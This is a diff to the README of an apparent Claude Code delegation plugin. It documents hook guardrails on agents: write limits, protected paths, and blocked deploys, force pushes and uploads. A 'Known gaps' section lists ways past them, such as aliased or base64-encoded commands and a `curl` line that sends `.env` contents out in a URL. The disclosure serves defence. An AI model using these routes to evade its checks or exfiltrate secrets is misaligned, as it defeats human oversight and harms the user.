@@ -93,9 +93,9 @@ You are the team's social media manager. ...
 |---|---|---|
 | `name`, `description`, `tools`, `skills` | as in Claude Code | Unchanged: Claude Code reads them (it logs the team fields below as keys it does not apply, which is expected) |
 | `department` | an `id` from `departments.json` | Where the agent is listed and which `/team` switch controls it. Missing or unknown: the agent **cannot be assigned** until the file is fixed, and `/team` lists it |
-| `does` | one line | What the Chief of Staff reads about the role. Missing: the description's first sentence |
+| `does` | one line | What the Chief of Staff reads about the role. Missing: the description's first sentence (a folded `description: >` block is read too). A file with neither is a problem |
 | `order` | a whole number | Where the agent sits in its department's list, lowest first (the shipped roles use 10, 20, ...). Without it, after the numbered ones, by name |
-| `write-limit` | `none` (default), `no-scripts`, `md-only` | `md-only`: only `.md` reports and notes. `no-scripts`: no scripts, build or deploy config (`.js`, `.ts`, `.py`, `.sh`, `wrangler.*`, `package.json`, CI files...); styles, HTML and component markup are fine. It can only **tighten**: the shipped roles keep the limits in the plugin's code (see below) whatever their file says |
+| `write-limit` | `none`, `no-scripts`, `md-only` | `md-only`: only `.md` reports and notes. `no-scripts`: no scripts, build or deploy config (`.js`, `.ts`, `.py`, `.sh`, `wrangler.*`, `package.json`, CI files...); styles, HTML and component markup are fine. It can only **tighten**: the shipped roles keep the limits in the plugin's code (see below) whatever their file says. **A new role must state it**: a role that is not one of the twelve shipped ones and states no `write-limit` writes only `.md` |
 | `limit-hint` | one line, quoted | Added to the role's denial message ("Describe the technique in your report; ...") |
 | `can-deploy` | `true` | Honoured **only** for a role the plugin's code allows to deploy (today only `devops-engineer`), and only as the exact type `chief-of-staff:<name>`. A new role gets deploy rights only by being added to `FLOOR` in `hooks/register.ts`, a code change on purpose |
 | `checked-by` | role names, comma-separated | Adds a routing line "`<role>`'s output goes to `<checker>` before it is called done" |
@@ -134,52 +134,132 @@ Your main session is the Chief of Staff. These things make it delegate:
   refused with a note to hand the work to an agent. Agents can still change files. This is the only rule
   `/delegate off` lifts.
 - **Role limits**, from the floor and each agent's frontmatter. `reverse-engineer` and `creative-director`
-  are `md-only`; `web-designer` is `no-scripts`. The same limits apply to MCP file tools (`write_file`,
-  `edit_block`, `move_file`, ...) through their path arguments. An agent whose type cannot be told gets
-  the tightest limits (`md-only`, no deploy).
+  are `md-only`; `web-designer` is `no-scripts`. The same limits apply to MCP tools whose names write,
+  download, export, generate, convert or extract files, through every argument that looks like a path,
+  and (best effort) to the files a shell command writes through redirects, `tee`, `cp`, `sed -i` and the
+  like. An agent whose type cannot be told gets the tightest limits (`md-only`, no deploy).
 - **Deploys and history.** Only `devops-engineer` can run deploy commands (`wrangler deploy`,
-  `npx wrangler@3 deploy`, `vercel`, `vercel --prod`, `netlify deploy`, `npm run deploy`,
-  `npm run-script deploy`, `pnpm -C site deploy`, `make deploy`, ...), the Chief of Staff included.
-  Rewriting git history is refused for everyone: `git filter-repo`, `git filter-branch`, BFG and pushes
-  that overwrite or delete on the remote (`--force`, `-f`, `--mirror`, `--delete`, `-d`, `+branch`,
-  `:branch`, quoted or not); only `devops-engineer` may `git push --force-with-lease`. The same checks run
-  over the arguments of MCP tools that run processes, shells or commands. Leaked keys are reported with
-  their location and rotation steps for you to act on. A blocked agent is told who the work belongs to.
-- **Protected paths.** No agent may write this plugin's own folder (its real path too), installed
-  plugins and their store (`.claude/plugins/`), or Claude Code's settings files (`.claude/settings*.json`),
-  with the file tools, MCP file tools or a shell command that writes there (best effort).
+  `wrangler --env prod deploy`, `npx wrangler@3 deploy`, `npm exec wrangler deploy`, `yarn wrangler deploy`,
+  `bun x wrangler deploy`, `vercel`, `vc --prod`, `netlify deploy`, `firebase deploy`, `npm run deploy*`,
+  `pnpm -C site deploy`, `make deploy*`, ...), the Chief of Staff included. Rewriting git history is
+  refused for everyone: `git filter-repo`, `git filter-branch`, BFG and pushes that overwrite or delete on
+  the remote (`--force`, `-f`, `--mirror`, `--delete`, `-d`, `--prune`, `+branch`, `:branch`, quoted or
+  not, also after a `$(...)`); only `devops-engineer` may `git push --force-with-lease`. These checks run
+  on Bash, Monitor, PowerShell and any other tool with a `command`, and on the command fields (`command`,
+  `cmd`, `input`, `script`, `code`) of MCP tools that run processes, shells or code. Leaked keys are
+  reported with their location and rotation steps for you to act on. A blocked agent is told who the work
+  belongs to.
+- **How commands are read.** A small tokenizer walks each command once: quotes and escapes (`"git"`,
+  `\git`), `$(...)` and backticks, `bash -c`, `eval`, heredocs fed to a shell, `find -exec`, and wrappers
+  (`sudo`, `env`, `timeout`, `nice`, `setsid`, `stdbuf`, `ionice`, `xargs`, `npx`, `bunx`, `pnpm exec`,
+  `npm exec`, `bun x`, `node <script>`). Nothing in it backtracks. A command over 16 KB is not read: an
+  agent's asks you (or is refused where nobody can be asked), the Chief of Staff's is refused.
+- **Protected paths.** No agent may write: this plugin's own folder (its real path too); installed plugins
+  and their store (`.claude/plugins/`); Claude Code's settings (`.claude/settings*.json`), agents, skills,
+  commands, hooks and output styles in any `.claude` folder; `~/.claude/CLAUDE.md`, `~/.claude.json`, any
+  `.mcp.json`, `managed-settings.json`. Paths are made plain first (`.`, `..`, `//`, `~`, `$HOME`) and
+  resolved through their nearest existing folder; a path that cannot be resolved (`~` without a known
+  home, `~someone`) is refused. A project's own `CLAUDE.md` or `CLAUDE.local.md` is not refused: you are
+  asked. For shell commands the check reads where the command writes (redirect targets, `tee`, `cp`,
+  `mv`, `install`, `ln`, `rsync`, `dd of=`, `curl -o`, `wget -O`, `tar -x -C`, `unzip -d`, `sed -i`,
+  `perl -i`, `touch`, `rm`, `git -C <dir> pull`, ..., after any `cd`): a protected destination, or one
+  under a folder named like this plugin (`chief-of-staff/...`, which also covers a `--plugin-dir` checkout),
+  is refused. A write it cannot follow (an inline `python -c` or `node -e`, a script, a variable in the
+  destination) is refused when the command mentions `.claude` with plugins, settings, agents, skills,
+  commands, hooks or CLAUDE.md, or `.claude.json`, `.mcp.json`, managed settings or the plugin's folder.
+  Plain reads pass (`grep x chief-of-staff/hooks/gate.ts > /tmp/out`): only the destination counts.
 - **Departments.** Agents of a department that is off cannot be assigned (see `/team`).
 - **The confirm gate**, an allow-list. When an agent (not the Chief of Staff) calls a connected (MCP)
   tool, you are asked first, with "Draft it and report back; the Chief of Staff does this only after the
   person confirms.", unless the tool is clearly read-only. Only an approval dialog for a person counts:
   where nobody can be asked, or a host would answer, the call is refused with that message.
-  - Read-only means the engine says so, or every word of the tool's name is a read verb (`get`, `list`,
-    `search`, `read`, `find`, ...) or a known noun, and the first word is not an action (`get_post`
-    passes, `post_status` asks). Anything unknown asks.
-  - Drafts pass: `create_draft`, `update_draft`, `create_comment_draft`, Slack's `send_message_draft`.
-    Any other action next to "draft" (`send_draft`, `publish_draft`, `commit_comment_draft`) asks.
+  - Read-only means every word of the tool's name is a read verb (`get`, `list`, `search`, `read`,
+    `find`, `fetch`, `show`, `view`, `retrieve`, ...) or a known noun, and the first word is not an action
+    (`get_post` passes, `post_status` asks). `resolve`, `check`, `suggest`, `scan`, `query`, `download`
+    and `extract` are not read verbs. Past and noun forms (`deleted`, `published`, `sender`, `payload`,
+    `merged`, `pushed`) are not actions. The server's own name in front is dropped (`slack_read_channel`)
+    unless it is itself an action word. The engine's own read-only word counts only when the name holds
+    no action word (create, update, set, share, write, make, delete, send, post, ...). Anything unknown asks.
+  - Named read tools pass on their own servers: Scrapling's fetch and session tools (`make_request`,
+    `open_request_session`, `session_make_request`, `browser_open`, `browser_close`, `browser_fetch`,
+    `stealthy_fetch`, `bulk_*`, `close_session`, `list_sessions`); Gmail's `label_*`, `unlabel_*`,
+    `untrash_*`, `unmark_*_spam` and `download_gmail_attachment`; Taplio's `pick_media`; Higgsfield's
+    balance, transactions, `show_*`, `get_*`, `list_*`, GPU and job status, quotes and presets; Canva's
+    `export-design`, formats, job and status tools, `help`, `resolve-shortlink`, `request-outline-review`;
+    21st's `get_*`, `list_*`, `search_*` and video read tools; and a few more (99tests reports, Booking.com
+    Q&A, ChangeThisFile's `list_conversions`, Claude Docs' `guide`, Composio's schema and search tools,
+    Slack's `search_*`, desktop-commander's search and read tools, `get_file_contents`, `list_commits`,
+    `search_code`, `browser_snapshot`, `browser_take_screenshot`, `retrieve_*`, `get-library-docs`,
+    `get_deployment_build_logs`). The bot-protection rule still applies to their arguments.
+  - Drafts pass: `create_draft`, `update_draft`, `create_comment_draft`, and `send_message_draft` on the
+    Slack server only. Any other action next to "draft" (`send_draft`, `publish_draft`,
+    `commit_comment_draft`) asks.
   - Names that hide a send, post, pay, publish, deploy, delete, transfer, refund, charge, merge or push
     (`sendmessage`, `SMSSend`) ask, and so do tools that run other tools or code (Composio
     `MULTI_EXECUTE` and `PROXY_EXECUTE`, `apps_invoke`, `execute_*`, process, shell and browser exec tools).
-  - Generating images, video, audio, voices and designs (Higgsfield `generate_*`, `create_voice`,
-    `upscale_*`, `remove_background`; Canva `create-design`, `generate-design`, `generate-image`;
-    text-to-speech) passes while generation credits are `free`, the default; `/delegate credits ask` makes
-    each one ask. Renting GPUs, buying credits, publishing, sharing, deploying, sending, ads writes,
-    contests, connecting accounts and secrets or databases always ask.
-  - Shell commands that run `claude`, change GitHub (`gh pr merge`, `gh release create|delete|edit`,
-    `gh repo delete|edit`, `gh workflow run`, `gh api` with a write method or `-f`/`-F` fields), or send
-    data to another host with `curl` or `wget` (a non-GET method, `-d`, `--data*`, `-F`, `--upload-file`;
-    localhost is fine) ask the same way.
+  - Generation credits (`/delegate credits free`, the default) cover only `generate_<media>` and
+    `<media>_generate`, where media is image, images, video, audio, voice, speech, music, sound,
+    sound_effect, design, 3d, avatar or thumbnail, with no other action word in the name; and these media
+    tools by name: `upscale_<media>`, `outpaint_image`, `reframe`, `remove_background`, `voice_change`,
+    `separate_stems`, `separate_image_layers`, `motion_control`, `scene_builder_3d_generate_*`,
+    `build_ai_influencer`, `create_voice`, `create_voice_from_confirmed_audio`, and Canva's `create-design`,
+    `create-video`, `create-design-from-*`, `resize-design`, `generate-design*`, `generate-image`.
+    `/delegate credits ask` makes each one ask. `generate_invoice`, `generate_api_key`,
+    `generate_and_email_report`, `ai_influencer_generate`, renting GPUs, buying credits, publishing,
+    sharing, deploying, sending, ads writes, contests, connecting accounts and secrets or databases ask.
+  - Shell commands (Bash, Monitor, PowerShell) ask the same way when they run `claude` (also
+    `npx @anthropic-ai/claude-code` or a `claude-code/cli.js`), change GitHub (`gh pr merge|create|review|comment`,
+    `gh release create|delete|edit`, `gh repo create|delete|edit`, `gh workflow run`, `gh issue create|comment`,
+    `gh gist create`, `gh secret set`, `gh api` with a write method, `-f`/`-F` fields, `--input` or a method
+    override header), publish a package (`npm publish`), move a branch ref (`git update-ref refs/heads/...`,
+    `git branch -f|-D main`), send data to another host with `curl`, `wget`, `http` or `xh` (a non-GET
+    method, `-d`, `--data*`, `-F`, `--upload-file`, `--json`; localhost is fine; `wget -T` and `-nd` are not
+    uploads), or write a project's `CLAUDE.md`.
   - The Chief of Staff itself is not gated: it asks you in the conversation.
 - **Instructions.** A "Chief of Staff" section in the main session's instructions, generated each message:
   the team grouped by department (only departments that are on and have assignable agents), the
   departments that are off, agent files with problems, department rules, the `checked-by` and `confirm`
   lines, and how to run the work: split it, brief each agent fully, run independent tasks in parallel,
-  check reports, sum up. Agents never get this section.
+  check reports, sum up. Agents never get this section. With `/delegate off` the section stays, without
+  the no-edit wording.
 
 It still answers plain questions itself. The status line shows `Chief of Staff: delegating` while the
 rule is on. Turn it off and on per machine with `/delegate off` and `/delegate on`; `/delegate` shows the
-settings, and `/delegate credits ask` or `/delegate credits free` sets generation credits.
+settings, and `/delegate credits ask` or `/delegate credits free` sets generation credits. `/delegate`
+and `/team` change settings only when you run them yourself (typed at the prompt, through Remote Control,
+or your own `claude -p`), not when a plugin, a schedule or another session runs them.
+
+### Known gaps
+
+These guardrails catch mistakes and the easy prompt-injection routes. They do not contain a determined
+agent. Real containment is the environment's network policy and Claude Code's permission mode and rules.
+Known ways past them, by design or not yet handled:
+
+- **Hooks not loaded.** Nothing here runs if Claude Code does not load the hooks module (see the next section).
+- **A program named by a variable or alias**: `c=claude; $c -p x`, `g=git; $g push -f`,
+  `git -c alias.p="push --force" p`, a git alias in config.
+- **Encoded or indirect commands**: base64 piped into `sh`, text piped into a shell
+  (`echo wrangler deploy | sh`), a command written to a script file and run, `python -c "os.system(...)"`,
+  `node -e "child_process..."`, MCP code runners (`run_code`) whose code is not a shell command.
+- **A force push whose refspec comes from a substitution or variable** (`git push origin $REF`): only a
+  substitution whose text shows a `+` or `:` is caught.
+- **Deploy tools other than** wrangler, vercel, netlify, firebase and npm/pnpm/yarn/bun/make scripts
+  named `deploy*`: `terraform apply`, `kubectl apply`, `fly deploy`, `railway up`, `gcloud app deploy`,
+  `aws s3 sync`, `docker push`, `heroku`, `surge`, GitHub Actions run by other means.
+- **Data sent out other ways**: a GET with data in the URL or headers (`curl "https://x/?k=$(cat .env)"`),
+  `scp`, `nc`, `git push` to a new remote, a script's own HTTP client.
+- **Write limits through the shell are best effort**: `web-designer` keeps Bash (its taste-skill scripts
+  need it), so its `no-scripts` limit holds for Edit, Write and MCP file tools, and for the shell only
+  where the tokenizer sees the destination (redirects, `tee`, `cp`, `sed -i`, ...), not for a script or
+  interpreter that writes files itself. The same holds for `md-only` roles that have Bash.
+- **Protected writes the tokenizer cannot see**: a destination built from a variable or substitution in a
+  command that does not otherwise name the protected place (`D=$(echo ...|base64 -d); cp x $D/store`), a
+  relative path written from inside the plugin's own folder (`echo x > hooks/register.ts` with the
+  plugin folder as the working directory), or a write by a script file.
+- **MCP tool names are a guess**: a server may name an acting tool like a read (`list_to_inbox`); the
+  allow-list errs towards asking, but a misleading name can pass.
+- **The confirm gate trusts Claude Code's approver**: it asks only when the engine says a person will
+  answer, and refuses otherwise.
 
 You can also ask for roles directly: "Have the web designer and the frontend developer build the homepage,
 then the security reviewer check it." For hardening, the security reviewer audits, the security engineer
@@ -259,10 +339,10 @@ Without REA the agent still works from the public page alone and says so.
 `seo-specialist`, `marketing-strategist` and `reverse-engineer` can use
 [Scrapling](https://github.com/D4Vinci/Scrapling)'s MCP tools to capture pages and crawl sites. Its
 CAPTCHA and Cloudflare solving is refused by a hook for every agent, whatever `/delegate` says.
-Under the confirm gate, `browser_fetch`, `browser_fetch_once`, `browser_extract`, `browser_screenshot`
-and `list_sessions` run without asking; `make_request`, `session_make_request`, `open_request_session`,
-`browser_open`, `browser_network_request(s)` and `close_session` ask you first, because their names do
-not say they only read (`make_request` can send any HTTP method).
+Under the confirm gate, Scrapling's fetch and session tools (`make_request`, `session_make_request`,
+`open_request_session`, `browser_open`, `browser_close`, `browser_fetch`, `browser_fetch_once`,
+`browser_extract`, `browser_screenshot`, `stealthy_fetch`, `bulk_*`, `close_session`, `list_sessions`) run
+without asking; the bot-protection rule still applies to every argument.
 Install once per machine (needs Python):
 
 ```bash
